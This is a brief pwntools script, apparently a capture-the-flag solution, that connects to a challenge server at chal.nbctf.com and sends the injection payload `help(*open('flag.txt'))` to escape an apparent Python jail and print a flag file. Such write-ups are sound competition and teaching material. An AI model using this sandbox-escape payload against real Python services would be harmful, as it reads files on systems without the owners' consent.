from pwn import *

r = remote("chal.nbctf.com",31381)

r.sendline(b"")

r.sendline(b"help(*open('flag.txt'))")

r.interactive()